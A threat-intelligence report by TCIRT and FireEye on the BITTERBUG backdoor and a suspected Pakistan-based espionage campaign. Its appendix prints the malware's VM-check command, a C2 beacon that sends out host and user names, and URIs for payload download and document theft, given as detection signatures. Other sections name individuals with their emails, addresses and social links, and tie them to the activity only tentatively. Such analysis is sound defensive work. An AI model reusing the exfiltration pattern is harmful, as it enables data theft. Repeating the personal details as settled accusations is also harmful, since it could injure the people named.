This group was revealed by TCIRT\n\npublicly in August 2013. In the months following the disclosure, we identified new activity. Cyber Squared partnered with experts\n\nat FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its\n\nOperation “Arachnophobia”. The following report is a product of collaborative research and threat intelligence sharing between\n\nCyber Squared Inc.’s TCIRT and FireEye Labs.\n\n#### Key Findings\n\n- While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently\n\npoint to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets and/or\n\nthose who are involved in India-Pakistan issues.\n\n- The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S. for\n\ncommand and control (C2).\n\n- The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with\n\ntwo IP addresses operated by a Pakistan-based hosting provider.\n\n- Early variants of the BITTERBUG malware had build paths containing the strings “Tranchulas” and “umairaziz27”.\n\nTranchulas is the name of a Pakistani security firm; Umair Aziz is the name of a Tranchulas employee.\n\n- Following the release of our blog post highlighting this activity and the malware’s build strings, the threat actors appear to have\n\nmodified their binary file paths to make them more generic.\n\n- Employees at both the Pakistan-based hosting provider and Tranchulas appear within each others’ social networks.\n\n#### Summary\n\n[On August 2, 2013, the TCIRT published the blog “Where There is Smoke, There is Fire: South Asian Cyber Espionage Heats](http://www.threatconnect.com/news/where-there-is-smoke-there-is-fire-south-asian-cyber-espionage-heats-up/)\n\n[Up” in which TCIRT identified custom malware, later dubbed BITTERBUG by FireEye, suspected to be linked to Pakistani-based](http://www.threatconnect.com/news/where-there-is-smoke-there-is-fire-south-asian-cyber-espionage-heats-up/)\n\nexploitation activity directed against Indian entities. We found debug path references to “Tranchulas”, which is also the name\n\nof a Pakistani security company. Tranchulas claims to support “national level cyber security programs” and the development of\n\noffensive and defensive cyber capabilities. At the time, the incident seemed to be an isolated one for TCIRT, but it was only the\n\nbeginning. Our suspicions of Tranchulas’ involvement in the activity began to mount, based on a series of events that occurred\n\nboth before and after the release of our blog post.\n\nDuring the past year, we communicated with Tranchulas and the Pakistan-based hosting provider. Suspicious responses and\n\noddly similar replies received from both companies to our inquiries, as well as anomalies in their email headers, prompted us to\n\nresearch the companies further. Our research revealed:\n\n- The C2 hosting provider (VPSNOC) has likely been conducting business operations from within Pakistan, subleasing\n\ninfrastructure from U.S. providers.\n\n- VPNSOC and Tranchulas employees have maintained some type of undefined relationship given connections via social media.\n\n- Both organizations have employed or are affiliated with personnel who have offensive cyber expertise.\n\n- When TCIRT was initially contacted by Tranchulas following our original blog post, they denied any involvement in the activity.\n\nTranchulas maintained that they were being framed, and that they were already aware of the activity prior to both our blog post\n\nand our contact. However, inconsistencies in their claims and their responses made such a scenario questionable.\n\n\n-----\n\n#### Backstory\n\nTCIRT began tracking a set of activity involving a BITTERBUG variant in May 2013. To our knowledge this customized malware\n\nhas only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.43[1] and\n```\n199.91.173.45.[2 3] According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,\n\n```\nMissouri. Based on public records, this organization appears to be a legal entity chartered to conduct business in Missouri.[4]\n\nOn July 24, 2013, TCIRT contacted the Kansas City-based hosting provider to notify them of the malicious activities emanating\n\nfrom IP address 199.91.173.43. The hosting provider subsequently introduced[5] TCIRT to their client VPNSOC, the customer\n\nresponsible for subleasing the IP address. Later that day, TCIRT received a response[6] from support@vpsnoc.com providing\n\nlimited information on the server and related traffic (Figure 2). When TCIRT sent follow-up communications, VPSNOC did not\n\nrespond, further increasing our suspicions.\n\n**Figure 2: VPSNOC Response**\n\n1 https://www.virustotal.com/en/ip-address/199.91.173.43/information/\n\n2 https://www.virustotal.com/en/ip-address/199.91.173.45/information/\n\n3 http://www.shodanhq.com/search?q=93c546-b1-4dbcbc6438380\n\n4 https://bsd.sos.mo.gov/BusinessEntity/BusinessEntityDetail.aspx?page=beSearch&ID=2936099\n\n5 Digital Appendix 2: Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500).eml\n\n6 Digital Appendix 2: Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500).eml\n\n\n-----\n\nWhile reviewing the metadata of VPSNOC’s July 24, 2013 email response, we noticed the email was sent from a +0500 time zone.\n\nThis time zone usage is consistent with Pakistan’s time zone.[7]\n\nThe TCIRT published details of the initial activity in the aforementioned blog post on August 2, 2013. Four days later on August 6,\n\n2013, the Tranchulas Chief Executive Officer, Zubair Khan, contacted us regarding the blog post and its subsequent press coverage.[8]\n\nKhan submitted “Response_ThreatConnect.docx”[9] as an explanation of the observed activity to both the media and the\n\nTCIRT indicating that the debug paths using “Tranchulas” and “umairaziz27” was “done by developer of malware to portray\n\nwrong impression about Tranchulas and mislead malware analysts”. Notably, Khan included a screenshot of an email message. The\n\nmessage was reportedly a response from VPSNOC to an email message from Tranchulas sent on July 21, 2013, purportedly to notify\n\nVPSNOC of the same malicious activity identified by TCIRT. However, we noted certain anomalies in this message.\n\n**Figure 3: Screenshot (image1.png) included within Response_ThreatConnect.docx**\n\nAs seen in Figure 3 the “email message” [10] was “sent” to VPSNOC from an unidentified tranchulas.com email address on “Tue,\n\nJul 21, 2013 at 11:36 PM.” July 21, 2013 was not a Tuesday and in fact was a Sunday. The mismatched date suggests that this\n\nemail message was potentially modified in order to support the claim that Tranchulas was aware of, and had already reported the\n\nexploitation activity. TCIRT speculates that “Tuesday” was hastily chosen because our own official notification to VPSNOC was sent\n\non Wednesday the 24th. In addition, the “response” received by Tranchulas is nearly identical to that received by TCIRT. We believe\n\nthat Tranchulas may have obtained information about TCIRT’s notification to VPSNOC through a pre-established relationship.[11]\n\n7 \u0007Digital Appendix 2: Raw Email Communications (Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500.eml) &\n(Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500.eml)\n\n8 http://www.theregister.co.uk/2013/08/07/india_cyberespionage/\n\n9 \u0007Digital Appendix 2: Raw Email Communications (Email#3 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up\n(Date- Wed, 7 Aug 2013 03-18-57 +0500).eml)\n\n10 Digital Appendix 1: Research Collateral image1.png (MD5:d224f39f8e20961b776c238731821d16) within Response_ThreatConnect.docx\n\n11 Appendix F: Personas (Persona #2)\n\n\n-----\n\nThe TCIRT responded to Mr. Khan’s official explanation with a follow-up inquiry, offering Khan an opportunity to explain the notable\n\ndate inconsistency within the email screenshot. The TCIRT also requested that Mr. Khan share the actual email message with the\n\noriginal attached headers. Mr. Khan did not address the TCIRT question, but rather deferred our request to Mr. Hamza Qamar,\n\na Penetration Testing Team Lead at Tranchulas. On August 15, 2013, three days later, Qamar responded to TCIRT with a brief\n\ndenial[12] of any modifications to the screenshot (other than email address anonymization) and specifically referred TCIRT back to\n\nVPSNOC support (support@vpsnoc.com) for any follow up questions.\n\nAstonished by this dismissal and deflection, TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas.\n\n#### VPSNOC/Digital Linx/Tranchulas\n\nDuring our research into VPSNOC, we identified that it is actually based in, or conducts partial operations from within, Pakistan.\n\nThe company only gives the impression of operating from Kansas City through marketing and the use of leased IP space (Figure\n\n4). The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting. Digital Linx is also a\n\nPakistan-based hosting company (Figure 5).\n\n**Figure 4: Screenshot of VPSnoc.com About us page**\n\n12 \u0007Digital Appendix 2: Raw Email Communications (Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up (Date- Thu, 15 Aug 2013 12-52-54 +0500).eml\n\n\n-----\n\n**Figure 5: Digital Linx (digitallinx.com)                                   Figure 6: Screenshot of DigitalLinx.net**\n\n**Website indicating its location                                                        contact page**\n\nAs seen in Figure 6, the administrative email address is admin@digitallinx.org.[13] This is the same registrant record for the\n```\ndigitallinx.net domain.[14] The domains digitillinx.org, digitallinx.net, and digitallinx.com share current\n\n```\nand historical similarities in their WHOIS records and sitemap.xml files [15 16] that imply they are all controlled by the same individual\n\nor entity. The domain digitallinx.com is registered to Muhammad Naseer Bhatti (Digital Linx Founder)[17 18 19] who uses email\n\naddresses naseer@digitallinx.com and nbhatti@gmail.com. The domain is also registered to the address 638-F Johar\n\nTown, Lahore Pakistan.[20]\n\nThe contact telephone number listed on Digital Linx’ web site is 925-665-1427 (Figure 6), and is also used in the WHOIS record\n\nfor defiantmarketing.com[21].\n\nThe domain defiantmarketing.com is registered to Abunasar Khan. The registration lists VPSNOC as the registrant organization,\n```\nabunasar@yahoo.com as the registration email address, and House 12, Street 21, F-8/1 Islamabad Federal 44000 as the\n\n```\nregistration address. Abunasar Khan has been observed using the aliases “agnosticon” [22] and “agnostic”. From this we were able to\n\nlocate an advertisement in the Blackhatworld forum from April 2012 posted by agnosticon promoting VPSNOC and identifying it as\n\na subdivision of Digital Linx Hosting (Figure 7).[23] Though none of this information is surprising, it further suggests that both Bhatti and\n\nAbunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan.[24]\n\n13 https://whois.domaintools.com/vpsnoc.com\n\n14 https://whois.domaintools.com/digitallinx.net\n\n15 http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us\n\n16 http://digitallinx.net/Contact.html\n\n17 https://whois.domaintools.com/digitallinx.com\n\n18 http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815\n\n19 https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ\n\n20 https://github.com/digitallinx/vBilling/blob/master/CHANGELOG\n\n21 https://whois.domaintools.com/defiantmarketing.com\n\n22 http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html\n\n23 http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html\n\n24 https://dazzlepod.com/rootkit/?page=284\n\n\n-----\n\n**Figure 7: Blackhatworld advertisement identifying VPSNOC as a Digital Linx subdivision[25]**\n\nAdditional research into Abunasar Khan identified several registered domains and fragments of his online presence. Based on his\n\nwebsites and account information, he appears to have an interest or participated in the Antisec[26] and Anonymous[27] movements\n\n(Figure 8). He also used “anony mo us” in the registration name field of a personal account [28].\n\nIn addition, Abunasar Khan’s Google+ profile revealed connections to at least one Tranchulas employee, Hamza Qamar[29] and a\n\nDigital Linx employee, Shoaib Riaz.[30] [31]Hamza Qamar, the Team Lead for Penetration Testing at Tranchulas, with whom TCIRT last\n\nspoke.[32] Visiting Hamza Qamar’s Google+ page (Figure 9), the only directly connected person was Abunasar Khan. At this point, it\n\nshows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with\n\nHamza Qamar, the Penetration Testing employee from Tranchulas.\n\n**Figure 8: Abunasar.net main page**\n\n25 http://vpsnoc.com/order.png\n\n26 http://abunasar.net\n\n27 http://pastebin.com/rqVGqh1q\n\n28 https://dazzlepod.com/rootkit/?page=284\n\n29 https://plus.google.com/105774284158907153401/about\n\n30 https://plus.google.com/105059395104464629441/about\n\n31 http://lists.horde.org/archives/horde/Week-of-Mon-20061225/032545.html\n\n32 https://plus.google.com/103436628630566104748/posts\n\n\n-----\n\n**Figure 9: Qamar’s only connection out of 40+ followers**\n\nQamar indicated on his public LinkedIn profile that he “engaged in system and enterprise level network and Web application\n\nsecurity testing for clients ranging from large federal agencies, DoD, and commercial clients”, though it is unclear which “DoD”\n\nis referenced (e.g., whether the Pakistani Ministry of Defense or some other nation’s defense department). Tranchulas identifies\n\ngovernment (presumably Pakistan’s government) as an operational sector for its work. Tranchulas’ offensive cyber initiative\n\nservices are offered to “national-level cyber security programs” [33] [34] indicating commercial demand from “national-level” customers.\n\nThough Tranchulas[35] brands itself as a multi-national company, with respective addresses within the United Kingdom[36,] the United\n\nStates[37,] and New Zealand[38]. We found evidence that these addresses are all associated with either virtual office spaces or\n\naddress forwarding services.\n\nFor further background information on these personas, please see Appendix F: Personas.\n\nThe following is a summary of the relationships between the hosting organizations and Tranchulas:\n\n- VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that\n\ncontained build strings that referenced “Tranchulas” and a Tranchulas employee.\n\n- Tranchulas and VPNSOC were in direct communication at some point in July-August 2013.\n\n- VPNSOC is a subsidiary of Digital Linx.\n\n- Tranchulas, VPNSOC, Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S.\n\n- Hamza Qamar was an employee of Tranchulas.\n\n33 \u0007http://www.prnewswire.co.uk/news-releases/tranchulas-steps-into-the-global-cyber-strategy-market-with-launch-of-the-offensive-cyberinitiative-oci-230411011.html\n\n34 Digital Appendix 3: Screenshot Archives (tranchulas.com/offensive-cyber-initiative-oci.png)\n\n35 Digital Appendix 3: Screenshot Archives (tranchulas.com/contact-us)\n\n36 http://www.londonpresence.com/contact-us/\n\n37 http://nextspace.us/nextspace-union-square-san-francisco/\n\n38 http://www.privatebox.co.nz/virtual-office/virtual-office-address.php\n\n\n-----\n\n- Muhammad Naseer Bhatti was the self-proclaimed founder of Digital Linx.\n\n- Abunasar Khan was affiliated with AntiSec and VPNSOC.\n\n- Digital Linx founder Muhammad Naseer Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan[39] –\n\nconnected through domain registrations and a common Google+ profile for Shoaib Riaz (another Digital Linx employee).\n\n- VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+.\n\n**_Note: A walkthrough of our research is available in Appendices C, D and E._**\n\n#### Technical Observations\n\n**Metadata Analysis:**\n\nAs mentioned earlier, during the email exchanged with Zubair Khan, he sent TCIRT a Microsoft Word document (.docx). In\n\nreviewing the document metadata for “Response_ThreatConnect.docx “, TCIRT identified that it contained the creator\n\nproperties of “hp.” TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and\n\nfound that both also had the author of “hp” (Figure 10).\n\n###### Decoys associated with BITTERBUG Tranchulas Documents\n\n**Figure 10: Matching Document Author Metadata**\n\n39 http://www.know-hosting.com/view/27108-digitallinx.html\n\n\n###### Decoys associated with BITTERBUG Tranchulas Documents\n\n\n-----\n\nWhile the author field of “hp” doesn’t conclusively prove a relationship, it contributes to the body of circumstantial evidence which\n\nlinks properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with\n\nBITTERBUG targeting campaigns.\n\n**Malware Analysis:**\n\nCyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity. FireEye\n\nanalyzed the malware, which they call BITTERBUG, and determined it to be a custom backdoor. The backdoor relies on various\n\nsupport components, including the non-malicious, publically available Libcurl[40] for installation, launch, and communications. In\n\nsome variants, BITTERBUG has the ability to automatically target and exfiltrate files with extensions such as .doc, .xls, .pdf, .ppt,\n\n.egm, and .xml. The full malware report is included in Appendix A: Malware Details.\n\nThe earliest evidence of the malware family dates to April 2013, based on Portable Executable (PE) compile times, with more than\n\n10 BITTERBUG variants observed to date. The earliest samples of BITTERBUG contain the “Tranchulas” debug path (below),\n\nas mentioned in the August 2013 TCIRT blog post. These BITTERBUG variants were probably used in attacks around summer\n\n2013, using possible lures related to the then-recent death of “Sarabjit Singh” (an Indian national imprisoned in Pakistan) and an\n\nIndian Government pension memorandum. As stated in the original blog (and raised in the formal Tranchulas response), several\n\nbinaries contain references to “Cath” in the debug path. It is important to note that the “Cath” files are support components and\n\nnot BITTERBUG variants, so it is probable that these were developed by another party but are a required component of the family.\n\n```\nC:\\Users\\Tranchulas\\Documents\\Visual Studio 2008\\Projects\\upload\\Release\\upload.pdb\nC:\\Users\\Cath\\documents\\visual studio 2010\\Projects\\ExtractPDF\\Release\\ExtractPDF.pdb\nC:\\Users\\Cath\\documents\\visual studio 2010\\Projects\\Start\\Release\\Start.pdb\n\n```\n\nAdditional BITTERBUG variants were compiled in June and July 2013 that contained different identifiers in the debug paths:\n\n“Cert-India” (3 samples) and “umairaziz27” (1 sample).[41] The presence of “umairaziz27” in a debug path from one\n\nsample makes us wonder if this represents an operational security mistake. The debug path of “umairaziz27” led us to Twitter[42]\n\nand LinkedIn[43] accounts (on which a matching alias is used) that belong to a Tranchulas employee named Umair Aziz, who\n\nidentified himself as an Information Security Analyst[44] and graduate of National University of Sciences and Technology[45] (NUST).[46]\n\nOne of these samples was probably used in attacks in late summer 2013, using a “leaked report” lure which contained a decoy\n\ndocument related to Pakistan’s alleged inability to locate Osama Bin Laden.\n\n```\nC:\\Users\\Cert-India\\Documents\\Visual Studio 2008\\Projects\\ufile\\Release\\ufile.pdb\n C:\\Users\\umairaziz27\\Documents\\Visual Studio 2008\\Projects\\usb\\Release\\usb.pdb\n\n```\n\nAfter publication of the TCIRT blog and our communications with Tranchulas occurred in August 2013, no new samples of\n\nBITTERBUG or its support components (based on compile times) were identified until September (various support components) and\n\nOctober (a new BITTERBUG variant). Interestingly, the samples compiled following the blog publication used entirely new and generic\n\ndebug paths (Figure 11) as well as a compilation tactic to conceal the C2 address from static analysis. Between September and\n\nDecember, we observed more variations of BITTERBUG and its support components in terms of packaging, host-based activities,\n\n40 http://curl.haxx.se/libcurl/\n\n41 Appendix A: Malware Details\n\n42 https://twitter.com/umairaziz27\n\n43 http://pk.linkedin.com/in/umairaziz27\n\n44 https://twitter.com/umairaziz27/status/332049978878996481\n\n45 www.nust.edu.pk\n\n46 http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profile%20SEECS%20%20BICSE.pdf\n\n\n-----\n\nand decoys (or the lack of them) compared to the samples before our blog post. This could indicate that the threat actors were aware\n\nof the blog post and modified their malware and related components to distance them from prior indicators.\n\n```\nC:\\Intel\\Logs\\file.pdb\n\n```\n\n**Figure 11: Generic Debug Path**\n\nBetween December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR)\n\nfiles. One from December contained several BITTERBUG variants and used a decoy PDF document (Figure 12) related to the\n\nDecember arrest of Devyani Khobragade,[47] an Indian diplomat in the United States. In spring 2014, we observed a SFXRAR file\n\nwith a filename lure related to the March 2014 disappearance of Malaysia Airlines Flight 370[48] (cast as a Pakistan-related hijacking).\n\nThis SFXRAR contained the latest BITTERBUG variant, which had new dependencies on support components. Interestingly, this\n\nSFXRAR’s filename was the only lure element related to the MH370 event; it did not contain a decoy document. We provide a\n\nmore detailed report on this SFX and the related variant in Appendix A: Malware Details.\n\n**Figure 12: Screenshot of Indian diplomat arrest decoy PDF**\n\nBITTERBUG continued to rely on the same network behaviors to communicate with its C2s. Connections to its C2 nodes relied on\n\nPHP and used communications that included “.php?compname=” and “.php?srs=”, as well as direct file/component retrieval\n\nfrom the C2s. Though many of the samples that we have observed use direct IPs for HTTP communications, we have also\n\nobserved more limited use of a No-IP domain.\n\n47 http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/\n\n48 http://www.businessinsider.com/mh370-investigators-find-evidence-of-a-mysterious-power-outage-during-the-early-part-of-its-flight-2014-6\n\n\n-----\n\n#### Conclusion\n\nOperation Arachnophobia consists of an apparent targeted exploitation campaign, dating back to early 2013, using the\n\nBITTERBUG malware family and seemingly directed against entities involved in India-Pakistan issues. The threat actor appears to\n\nhave exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S. hosting services, for both the\n\ndelivery and C2 phases of attack. Research later identified that a Pakistan-based VPSNOC representative had a social network\n\naffiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements.\n\nAfter the August 6, 2013 blog, Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG\n\nactivity, however, this explanation contained discrepancies. The TCIRT addressed some of these discrepancies with Tranchulas\n\npersonnel, who were unresponsive, increasing our suspicion of the activity. We later observed BITTERBUG activity following\n\nAugust 2013 with subtle changes that further generalized debug paths. It was this chain of events that served as a catalyst for\n\nextra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information.\n\nWhile we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently point\n\nto many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets or those who\n\nare involved in India-Pakistan issues. Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed\n\npart of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and\n\norigins (behind U.S. infrastructure), before and after public disclosure in August 2013.\n\nOn the surface, BITTERBUG serves as an example of how threat actors mask their operations across social, cultural and\n\ngeographic boundaries. More importantly, it demonstrates the value of threat intelligence sharing and industry collaboration. As\n\none organization begins to pull at a thread of evidence and share their findings with another, a larger understanding and shared\n\nperspective is revealed. It is through this process that a shared awareness emerges into a larger, more comprehensive story that\n\nexplains what we are seeing and why - ultimately it is this story that better serves us all.\n\n\n-----\n\n### APPENDIX\n\n#### APPENDIX A: Malware Details\n\n###### BITTERBUG\n\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,\n\nand automatically transferring selected files to its command and control (C2) server. BITTERBUG appears to be virtual machine aware\n\nand may not execute on a VMWare or VirtualBox VM. We have observed BITTERBUG installed by a self-extracting RAR archive\n\ndisguised as a screensaver. Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and\n\nthe BITTERBUG executable. The timeline below is of BITTERBUG activity from May 2013 through March 2014.\n\n**Timeline of BITTERBUG characteristics vs.ThreatConnect events**\n\n\n-----\n\n###### Details\n\nUpon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:\n\n- `libcurld.dll – Used for downloading and uploading files`\n\n- `msvcm90d.dll – C runtime library`\n\n- `msvcp90d.dll – C runtime library`\n\n- `msvcr90d.dll – C runtime library`\n\nThe self-extracting RAR may install the following benign configuration files:\n\n- `Microsoft.VC90.DebugCRT.manifest – Compilation artifact`\n\n- `BtcirEt.DZU – Self-extracting RAR configuration file`\n\n- `SJeXSrA.KNX – Self-extracting RAR configuration file`\n\n- `VCAKSQl.TNT – Self-extracting RAR configuration file`\n\nBITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a\n\nvirtual machine (VM):\n\n- cmd.exe /c wmic diskdrive list brief >\n```\n “%APPDATA%\\Microsoft\\recovery.txt”\n\n```\nBITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware. The backdoor then may\n\nenter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13).\n\n**Figure 13: Example recovery.txt file from VMware virtual machine**\n\nNext BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised\n\nsystem. An example beacon request is shown in Figure 14.\n\n\nPOST /path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%> HTTP/1.1\nHost: <c2_location>\nAccept: */*\nContent-Length: 25\nContent-Type: application/x-www-form-urlencoded\n<%COMPUTERNAME%>_<%USERNAME%>\n\n\n<%COMPUTERNAME%>\n\n\n<%USERNAME%>\n\n\n<%USERNAME%>\n\n\nContent-Length: 25\n\n\nHTTP/1.1\n\n\nContent-Type: application/x-www-form-urlencoded\n\n\n**Figure 14: Initial C2 beacon**\n\n\n<%USERNAME%>\n\n\n<%COMPUTERNAME%>\n\n\nAccept: */*\n\n\n<c2_location>\n\n\n-----\n\nBITTERBUG then may perform an HTTP GET request for the following URI:\n```\nhttp://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\n\n```\nIf the C2 server responds with a filename, the filename received is deleted from %APPDATA%\\Microsoft<FILE_NAME_FROM_\n```\nC2>. The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this\n\n```\ncommand occurring in the wild.\n\nBITTERBUG then may attempt to download the files listed in Table 1. The purpose of the first three files is unknown. The final two\n\nfiles are downloaded to the user’s Startup directory and executed at startup in order to maintain persistence.\n\n\n###### Request URI Download Path\n\n\nhttp://<c2_location>/versionchk.php?srs=436712384 %APPDATA%\\Microsoft\\file.exe\n\nhttp://<c2_location>/vtris.php?srs=436712384 %APPDATA%\\Microsoft\\percf001.dat\n\nhttp://<c2_location>/vtris1.php?srs=436712384 %APPDATA%\\Microsoft\\percf002.dat\n\n\nhttp://<c2_location>/is_array_max.php?compname=\n\n<%COMPUTERNAME%>_<%USERNAME%>\n\nhttp://<c2_location>/is_array_pal.php?compname=\n\n<%COMPUTERNAME%>_<%USERNAME%>\n\n\n%USERPROFILE%\\Start Menu\\Programs\\\n\nStartup\\wincheck.exe\n\n%USERPROFILE%\\Start Menu\\Programs\\\n\nStartup\\winsquirt.exe\n\n\n**Table 1: Files downloaded by the backdoor**\n\nNext, BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions: .doc,\n```\n.ppt, .xls, .pdf, .docx, .pptx, .pps, .xlsx\n\n```\nBITTERBUG then typically creates a file list containing all documents (excluding those whose filename contains MediaUtils) to\n\nthe following locations:\n\n- `%APPDATA%\\Microsoft\\plang006.txt`\n\n- `%APPDATA%\\Microsoft\\tlang006.txt`\n\nBITTERBUG may also write a list of all running processes to:\n\n- `%APPDATA%\\Microsoft\\prc.dat`\n\nFinally, BITTERBUG typically uploads the running process list, document file list, and all documents to the following URI:\n\n- `http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>`\n\n###### Host-Based Signatures\n\n**File System Residue**\n\nBITTERBUG may be extracted along with the following embedded files:\n\n- `%USERPROFILE%\\5rv3fgk6\\<BITTERBUG>.exe`\n\n- `%USERPROFILE%\\5rv3fgk6\\libcurld.dll`\n\n- `%USERPROFILE%\\5rv3fgk6\\msvcm90d.dll`\n\n- `%USERPROFILE%\\5rv3fgk6\\msvcp90d.dll`\n\n- `%USERPROFILE%\\5rv3fgk6\\msvcr90d.dll`\n\n- `%USERPROFILE%\\5rv3fgk6\\Microsoft.VC90.DebugCRT.manifest`\n\n\n-----\n\n- `%USERPROFILE%\\5rv3fgk6\\SJeXSrA.KNX`\n\n- `%USERPROFILE%\\5rv3fgk6\\BtcirEt.DZU`\n\n- `%USERPROFILE%\\5rv3fgk6\\VCAKSQl.TNT`\n\nThe malware may create the following files:\n\n- `%APPDATA%\\Microsoft\\recovery.txt`\n\n- `%APPDATA%\\Microsoft\\plang006.txt`\n\n- `%APPDATA%\\Microsoft\\tlang006.txt`\n\n- `%APPDATA%\\Microsoft\\prc.dat`\n\n- `%APPDATA%\\Microsoft\\file.exe`\n\n- `%APPDATA%\\Microsoft\\percf001.dat`\n\n- `%APPDATA%\\Microsoft\\percf002.dat`\n\n- `%USERPROFILE%\\Start Menu\\Programs\\Startupwincheck.exe`\n\n- `%USERPROFILE%\\Start Menu\\Programs\\Startup\\winsquirt.exe`\n\n###### Network-Based Signatures\n\n- The malware typically communicates on TCP port 80:\n\n- The malware may perform HTTP requests for the following URIs:\n\n   - `http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>`\n\n   - `http://<c2_location>/is_array_max.php?compname=<%COMPUTERNAME%>_<%USERNAME%>`\n\n   - `http://<c2_location>/is_array_pal.php?compname=<%COMPUTERNAME%>_<%USERNAME%>`\n\n   - `http://<c2_location>/path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%>`\n\n   - `http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>`\n\n   - `http://<c2_location>/versionchk.php?srs=436712384`\n\n   - `http://<c2_location>/vtris.php?srs=436712384`\n\n   - `http://<c2_location>/vtris1.php?srs=436712384`\n\n###### File Manipulations\n\nWe observed other interesting operational security-oriented challenges in the post-blog post samples. In one case, an actor\n\nappeared to manually null out the “Cert-India” user directory in one of the file paths (see figures 15 and 16 below) contained in\n\ntwo binaries (support components). These files shared the same import hash (4e96e86db5a8a025b996aefdc218ff74) and were\n\nvirtually the same files minus modification to a few bytes in the second sample.\n\n**Figure 15: Original file content for 7588ff900e32145cbcbc77837237aef8**\n\n\n-----\n\n**Figure 16: Nulled file path for 26616e6662b390ebdb588cdaaae5e4f6**\n\nAs these samples point to, we also observed use of the C++ Boost libraries, which introduced a new file path to monitor for\n\noperational security purposes. We observed at least one case in which files mixed old and new file paths, as seen in the figures 17\n\nand 18 below.\n\n**Figures 17 and 18: Screenshots from two locations in 6e8c4d2d5d4e5e7853a1842b04a6bfdf**\n\nIn both cases, it is possible that the actors intentionally did this in an attempt to mislead further research efforts into post\nblog samples or cast suspicion on “Cert-India” as a more-revealing element. For example, analysis of files deployed alongside\n\nthe nulled-out “Cert-India” sample mentioned above revealed a lack of concern over the same string. Alternatively, these\n\ninconsistencies could also indicate sloppy tradecraft and/or teamwork.\n\n```\nC:\\Users\\CertIndia\\Documents\\boost_1_53_0\\boost/thread/win32/thread_primitives.hpp\n\n```\n\n-----\n\n#### APPENDIX B: MD5 Hashes and Malware Table\n\n###### BITTERBUG

